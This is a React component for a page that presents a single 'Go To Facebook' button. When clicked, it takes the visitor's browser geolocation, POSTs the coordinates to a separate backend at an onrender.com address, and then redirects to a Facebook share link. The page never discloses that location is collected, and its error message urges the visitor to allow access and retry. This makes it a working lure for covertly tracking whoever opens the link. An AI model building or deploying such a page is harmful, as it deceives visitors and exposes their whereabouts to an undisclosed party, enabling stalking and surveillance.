import './App.css';
import { useEffect, useState } from "react";
import { FaSpinner } from "react-icons/fa";

function App() {
  const FB_LINK = "https://www.facebook.com/share/r/1EjiX5jtYP/";
  const [status, setStatus] = useState('idle'); // idle | locating | sending | error
  const apiUrl = (import.meta.env.VITE_API_URL || 'https://loac-backend.onrender.com').replace(/\/$/, '');

  useEffect(() => {
    const resetStatus = () => setStatus('idle');
    window.addEventListener('pageshow', resetStatus);

    return () => window.removeEventListener('pageshow', resetStatus);
  }, []);

  const handleGo = () => {
    setStatus('locating');

    if (!navigator.geolocation) {
      setStatus('error');
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        setStatus('sending');

        try {
          const response = await fetch(`${apiUrl}/location`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude, longitude }),
          });

          if (!response.ok) {
            throw new Error(`Location API returned ${response.status}`);
          }
        } catch (error) {
          console.error('Error sending location:', error);
          setStatus('error');
          return;
        }

        // Redirect to Facebook after location is sent
        setStatus('idle');
        window.location.href = FB_LINK;
      },
      (error) => {
        console.error('Error getting location:', error);
        setStatus('error');
      }
    );
  };

  return (
    <div className="h-lvh flex flex-col justify-center items-center gap-4">

      {status !== 'error' && (
        <button
          className="py-3 px-10 border rounded-sm bg-slate-300 text-black"
          onClick={handleGo}
          disabled={status !== 'idle'}
        >
          <span className="inline-flex items-center gap-2">
            Go To Facebook
            {status === 'sending' && <FaSpinner className="animate-spin" aria-hidden="true" />}
          </span>
        </button>
      )}

      {status === 'error' && (
        <>
          <p role="alert">
            Could not get or save your location. Allow location access and check your connection, then try again.
          </p>
          <button
            className="mt-2 px-4 py-2 bg-blue-500 text-white rounded"
            onClick={handleGo}
          >
            Retry
          </button>
        </>
      )}
    </div>
  );
}

export default App;
